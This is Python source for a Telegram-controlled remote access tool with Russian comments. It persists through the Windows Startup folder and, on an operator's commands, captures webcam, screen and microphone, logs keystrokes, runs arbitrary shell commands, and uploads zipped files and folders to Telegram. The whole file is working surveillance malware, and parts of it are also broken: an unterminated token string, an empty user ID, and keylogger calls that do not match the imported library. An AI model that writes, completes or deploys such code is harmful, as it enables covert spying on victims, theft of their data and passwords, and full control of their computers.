import telebot
import cv2
import os
import mss
import numpy as np
import sounddevice as sd
import scipy.io.wavfile as wav
import subprocess
import keyboard
import zipfile
import threading
import sys
import time

# Вставьте ваш токен бота и ID пользователя
TELEGRAM_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN 
USER_ID =            #your id

bot = telebot.TeleBot(TELEGRAM_TOKEN)
recording_screen = False
recording_video = False
recording_audio = False
recording_keys = False
screen_writer = None
video_writer = None
audio_writer = None
cap = None
frames = []

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(sys.argv[0]))
    bat_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    bat_file = os.path.join(bat_path, "openbot.bat")
    with open(bat_file, "w+") as bat_file:
        bat_file.write(r'start "" /B "{}"'.format(file_path))

def notify_startup():
    try:
        bot.send_message(USER_ID, "Компьютер был включен.")
    except Exception as e:
        print(f"Не удалось отправить уведомление о старте: {e}")

def notify_shutdown():
    try:
        bot.send_message(USER_ID, "Компьютер был выключен.")
    except Exception as e:
        print(f"Не удалось отправить уведомление о завершении работы: {e}")

def start_bot():
    try:
        print("Бот запущен и ожидает команды.")
        add_to_startup(sys.argv[0])
        notify_startup()
        bot.polling()
    except Exception as e:
        print(f"Произошла ошибка: {e}")
        # Запускаем скрипт заново
        subprocess.call([sys.executable, sys.argv[0]])
        sys.exit()

# Команды для бота

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.from_user.id == USER_ID:
        bot.reply_to(message, "Привет! Отправь команду /webcamera для снимка с веб-камеры, /mon для скриншота рабочего стола, /weblive для записи видео с веб-камеры, /monlive для записи экрана, /micro для записи звука, /cmd для выполнения команд, /keyb для записи клавиш, /backup для копирования данных.")
    else:
        bot.reply_to(message, "Извините, эта команда доступна только для авторизованных пользователей.")

@bot.message_handler(commands=['webcamera'])
def send_photo(message):
    if message.from_user.id != USER_ID:
        bot.reply_to(message, "Извините, эта команда доступна только для авторизованных пользователей.")
        return

    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            bot.reply_to(message, "Не удалось открыть веб-камеру.")
            return

        ret, frame = cap.read()
        if ret:
            image_path = 'snapshot.jpg'
            cv2.imwrite(image_path, frame)
            cap.release()
            with open(image_path, 'rb') as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove(image_path)
        else:
            bot.reply_to(message, "Не удалось сделать снимок.")
            cap.release()
    except Exception as e:
        bot.reply_to(message, "Произошла ошибка: " + str(e))

@bot.message_handler(commands=['mon'])
def send_screenshot(message):
    if message.from_user.id != USER_ID:
        bot.reply_to(message, "Извините, эта команда доступна только для авторизованных пользователей.")
        return

    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            img = np.array(screenshot)
            image_path = 'screenshot.png'
            cv2.imwrite(image_path, cv2.cvtColor(img, cv2.COLOR_BGRA2BGR))
            with open(image_path, 'rb') as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove(image_path)
    except Exception as e:
        bot.reply_to(message, "Произошла ошибка: " + str(e))

@bot.message_handler(commands=['monlive'])
def toggle_screen_recording(message):
    global recording_screen, screen_writer, frames

    if message.from_user.id != USER_ID:
        bot.reply_to(message, "Извините, эта команда доступна только для авторизованных пользователей.")
        return

    try:
        if recording_screen:
            recording_screen = False
            video_path = 'screen_record.avi'
            if frames:
                height, width, _ = frames[0].shape
                screen_writer = cv2.VideoWriter(video_path, cv2.VideoWriter_fourcc(*'XVID'), 5, (width, height))
                for frame in frames:
                    screen_writer.write(frame)
                screen_writer.release()
                with open(video_path, 'rb') as video:
                    bot.send_video(message.chat.id, video)
                os.remove(video_path)
            bot.reply_to(message, "Запись экрана завершена и отправлена.")
        else:
            recording_screen = True
            frames = []
            bot.reply_to(message, "Запись экрана началась. Повторно отправьте команду /monlive для остановки и отправки записи.")
            def screen_recording():
                while recording_screen:
                    with mss.mss() as sct:
                        monitor = sct.monitors[1]
                        screenshot = sct.grab(monitor)
                        img = np.array(screenshot)
                        frames.append(cv2.cvtColor(img, cv2.COLOR_BGRA2BGR))
                    cv2.waitKey(200)
            threading.Thread(target=screen_recording).start()
    except Exception as e:
        bot.reply_to(message, "Произошла ошибка: " + str(e))

@bot.message_handler(commands=['weblive'])
def toggle_video_recording(message):
    global recording_video, video_writer, cap

    if message.from_user.id != USER_ID:
        bot.reply_to(message, "Извините, эта команда доступна только для авторизованных пользователей.")
        return

    try:
        if recording_video:
            recording_video = False
            if cap:
                cap.release()
            if video_writer:
                video_writer.release()
            with open('webcam_record.avi', 'rb') as video:
                bot.send_video(message.chat.id, video)
            os.remove('webcam_record.avi')
            bot.reply_to(message, "Запись видео завершена и отправлена.")
        else:
            recording_video = True
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                bot.reply_to(message, "Не удалось открыть веб-камеру.")
                return
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            video_writer = cv2.VideoWriter('webcam_record.avi', fourcc, 20.0, (640, 480))
            bot.reply_to(message, "Запись видео началась. Повторно отправьте команду /weblive для остановки и отправки записи.")
            def video_recording():
                while recording_video:
                    ret, frame = cap.read()
                    if not ret:
                        break
                    video_writer.write(frame)
                    cv2.waitKey(1)
            threading.Thread(target=video_recording).start()
    except Exception as e:
        bot.reply_to(message, "Произошла ошибка: " + str(e))
        if cap:
            cap.release()
        if video_writer:
            video_writer.release()

@bot.message_handler(commands=['micro'])
def toggle_audio_recording(message):
    global recording_audio, frames

    if message.from_user.id != USER_ID:
        bot.reply_to(message, "Извините, эта команда доступна только для авторизованных пользователей.")
        return

    try:
        if recording_audio:
            recording_audio = False
            wav.write('audio_record.wav', 44100, np.concatenate(frames))
            with open('audio_record.wav', 'rb') as audio:
                bot.send_audio(message.chat.id, audio)
            os.remove('audio_record.wav')
            bot.reply_to(message, "Запись звука завершена и отправлена.")
        else:
            recording_audio = True
            frames = []
            bot.reply_to(message, "Запись звука началась. Повторно отправьте команду /micro для остановки и отправки записи.")
            def callback(indata, frames_data, time, status):
                if recording_audio:
                    frames.append(indata.copy())
            with sd.InputStream(callback=callback):
                while recording_audio:
                    sd.sleep(1000)
    except Exception as e:
        bot.reply_to(message, "Произошла ошибка: " + str(e))

@bot.message_handler(commands=['cmd'])
def execute_command(message):
    if message.from_user.id != USER_ID:
        bot.reply_to(message, "Извините, эта команда доступна только для авторизованных пользователей.")
        return

    try:
        command = message.text.split(maxsplit=1)
        if len(command) < 2:
            bot.reply_to(message, "Пожалуйста, укажите команду для выполнения.")
            return

        command = command[1]
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        # Ограничим длину результата до 4000 символов
        output = result.stdout + "\n" + result.stderr
        if len(output) > 4000:
            output = output[:4000] + "\n... (результат обрезан)"

        bot.reply_to(message, f"Результат выполнения команды:\n{output}")
    except Exception as e:
        bot.reply_to(message, "Произошла ошибка: " + str(e))

@bot.message_handler(commands=['keyb'])
def toggle_key_logging(message):
    global recording_keys

    if message.from_user.id != USER_ID:
        bot.reply_to(message, "Извините, эта команда доступна только для авторизованных пользователей.")
        return

    try:
        if recording_keys:
            recording_keys = False
            with open('keylog.txt', 'rb') as keylog:
                bot.send_document(message.chat.id, keylog)
            os.remove('keylog.txt')
            bot.reply_to(message, "Запись клавиш завершена и отправлена.")
        else:
            recording_keys = True
            with open('keylog.txt', 'w') as keylog:
                def on_press(key):
                    if recording_keys:
                        try:
                            keylog.write(f"{key.char}")
                        except AttributeError:
                            if key == keyboard.Key.space:
                                keylog.write(" ")
                            elif key == keyboard.Key.enter:
                                keylog.write("\n")
                            else:
                                keylog.write(f"[{key.name}]")

                with keyboard.Listener(on_press=on_press) as listener:
                    bot.reply_to(message, "Запись клавиш началась. Повторно отправьте команду /keyb для остановки и отправки записи.")
                    listener.join()
    except Exception as e:
        bot.reply_to(message, "Произошла ошибка: " + str(e))

@bot.message_handler(commands=['backup'])
def backup_data(message):
    if message.from_user.id != USER_ID:
        bot.reply_to(message, "Извините, эта команда доступна только для авторизованных пользователей.")
        return

    try:
        command = message.text.split(maxsplit=1)
        if len(command) < 2:
            bot.reply_to(message, "Пожалуйста, укажите целевой диск или файл для резервного копирования.")
            return
        
        target = command[1]
        
        if os.path.isdir(target):
            zip_filename = f"{target}_backup.zip"
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(target):
                    for file in files:
                        file_path = os.path.join(root, file)
                        zipf.write(file_path, os.path.relpath(file_path, target))
            with open(zip_filename, 'rb') as backup_file:
                bot.send_document(message.chat.id, backup_file)
            os.remove(zip_filename)
        elif os.path.isfile(target):
            zip_filename = f"{target}.zip"
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                zipf.write(target, os.path.basename(target))
            with open(zip_filename, 'rb') as backup_file:
                bot.send_document(message.chat.id, backup_file)
            os.remove(zip_filename)
        else:
            bot.reply_to(message, "Целевой путь не найден.")
    except Exception as e:
        bot.reply_to(message, "Произошла ошибка: " + str(e))

if __name__ == "__main__":
    start_bot()
